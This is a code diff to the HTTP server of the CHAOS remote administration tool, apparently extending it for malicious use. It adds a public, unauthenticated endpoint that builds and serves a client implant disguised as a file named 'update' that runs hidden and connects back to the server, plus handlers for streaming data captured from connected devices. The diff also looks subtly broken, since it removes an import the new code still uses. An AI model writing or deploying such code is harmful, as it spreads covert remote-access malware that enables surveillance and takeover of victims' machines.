@@ -9,14 +9,14 @@ import (
 	"github.com/gin-gonic/gin/binding"
 	"github.com/gorilla/websocket"
 	"github.com/sirupsen/logrus"
-	"github.com/tiagorlampert/CHAOS/entities"
-	"github.com/tiagorlampert/CHAOS/internal"
-	"github.com/tiagorlampert/CHAOS/internal/utils"
-	"github.com/tiagorlampert/CHAOS/internal/utils/network"
-	"github.com/tiagorlampert/CHAOS/internal/utils/system"
-	"github.com/tiagorlampert/CHAOS/presentation/http/request"
-	"github.com/tiagorlampert/CHAOS/services/client"
-	"github.com/tiagorlampert/CHAOS/services/user"
+	"chaos/entities"
+	"chaos/internal/utils"
+	"sync"
+	"chaos/internal/utils/network"
+	"chaos/internal/utils/system"
+	"chaos/presentation/http/request"
+	"chaos/services/client"
+	"chaos/services/user"
 	"net/http"
 	"net/url"
 	"os"
@@ -198,7 +198,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 
 func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
 	c.HTML(http.StatusOK, "generate.html", gin.H{
-		"Address":  network.GetLocalIP(),
+		"Address":  network.GetLocalIP().String(),
 		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
 		"OSTarget": system.OSTargetMap,
 	})
@@ -351,6 +351,59 @@ func (h *httpController) openUrlHandler(c *gin.Context) {
 	return
 }
 
+func (h *httpController) publicPageHandler(c *gin.Context) {
+	c.HTML(http.StatusOK, "public.html", gin.H{})
+	return
+}
+
+func (h *httpController) publicDownloadHandler(c *gin.Context) {
+	osStr := c.DefaultQuery("os", "windows")
+	var osTarget system.OSType
+	switch strings.ToLower(osStr) {
+	case "windows":
+		osTarget = system.Windows
+	case "linux":
+		osTarget = system.Linux
+	default:
+		osTarget = system.Windows
+	}
+	binary, err := h.ClientService.BuildClient(client.BuildClientBinaryInput{
+		ServerAddress: network.GetLocalIP().String(),
+		ServerPort:    strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
+		OSTarget:      osTarget,
+		Filename:      "update",
+		RunHidden:     true,
+	})
+	if err != nil {
+		h.Logger.Error(err)
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+	targetPath := filepath.Join(internal.TempDirectory, binary)
+	c.Header("Content-Transfer-Encoding", "binary")
+	c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, binary))
+	c.File(targetPath)
+}
+
+func (h *httpController) streamHandler(c *gin.Context) {
+	deviceID := c.Param("device")
+	c.HTML(http.StatusOK, "stream.html", gin.H{
+		"DeviceID": deviceID,
+	})
+}
+
+func (h *httpController) streamDataHandler(c *gin.Context) {
+	deviceID := c.Param("device")
+	streamType := c.Param("type")
+	key := deviceID + "_" + streamType
+
+	if data, ok := getStreamData(key); ok {
+		c.Data(http.StatusOK, "application/octet-stream", data)
+	} else {
+		c.Status(http.StatusNoContent)
+	}
+}
+
 func (h *httpController) clientHandler(c *gin.Context) {
 	clientID := c.GetHeader("x-client")
 
@@ -369,4 +422,27 @@ func (h *httpController) clientHandler(c *gin.Context) {
 	}
 
 	h.Logger.Println("Client connected: ", clientID)
+}
+
+// Embedded stream functions
+var streamData = make(map[string][]byte)
+var streamMutex sync.Mutex
+
+func setStreamData(key string, data []byte) {
+	streamMutex.Lock()
+	defer streamMutex.Unlock()
+	streamData[key] = make([]byte, len(data))
+	copy(streamData[key], data)
+}
+
+func getStreamData(key string) ([]byte, bool) {
+	streamMutex.Lock()
+	defer streamMutex.Unlock()
+	data, ok := streamData[key]
+	if !ok {
+		return nil, false
+	}
+	result := make([]byte, len(data))
+	copy(result, data)
+	return result, true
 }
